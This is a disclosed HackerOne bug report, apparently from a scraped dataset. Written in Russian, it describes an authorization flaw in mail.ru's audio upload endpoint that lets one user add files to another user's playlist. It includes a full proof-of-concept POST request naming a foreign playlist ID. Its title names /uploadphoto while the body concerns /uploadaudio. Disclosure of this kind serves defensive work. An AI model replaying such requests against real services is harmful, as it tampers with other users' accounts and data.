---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '140548'
original_report_id: '140548'
title: '[upload-X.my.mail.ru] /uploadphoto Insecure Direct Object References'
weakness: Improper Authentication - Generic
team_handle: mailru
created_at: '2016-05-23T20:28:09.786Z'
disclosed_at: '2016-10-03T11:56:08.560Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- improper-authentication-generic
---

# [upload-X.my.mail.ru] /uploadphoto Insecure Direct Object References

## Metadata

- HackerOne Report ID: 140548
- Weakness: Improper Authentication - Generic
- Program: mailru
- Disclosed At: 2016-10-03T11:56:08.560Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

При загрузке аудио-файла с помощью сценария 
https://upload-14.my.mail.ru/uploadaudio 
отсутствует проверка принадлежности указанного playlist_id текущему пользователю.

Пример добавленного файла в чужой плейлист:
https://my.mail.ru/music/playlists/18226273862

Пример запроса:
```
POST /uploadaudio HTTP/1.1
Host: upload-14.my.mail.ru
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Referer: https://my.mail.ru/
Content-Length: 105440
Content-Type: multipart/form-data; boundary=---------------------------6361250362170
Origin: https://my.mail.ru
Cookie: <COOKIE>
Connection: close

-----------------------------6361250362170
Content-Disposition: form-data; name="upload"; filename="123.mp3"
Content-Type: audio/mpeg

<AUDIO>
-----------------------------6361250362170
Content-Disposition: form-data; name="mna"

758715091
-----------------------------6361250362170
Content-Disposition: form-data; name="mnb"

4180609092
-----------------------------6361250362170
Content-Disposition: form-data; name="user"

undefined
-----------------------------6361250362170
Content-Disposition: form-data; name="agree"

on
-----------------------------6361250362170
Content-Disposition: form-data; name="playlist_id"

18226273862
-----------------------------6361250362170
Content-Disposition: form-data; name="for_multipost"

0
-----------------------------6361250362170--
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
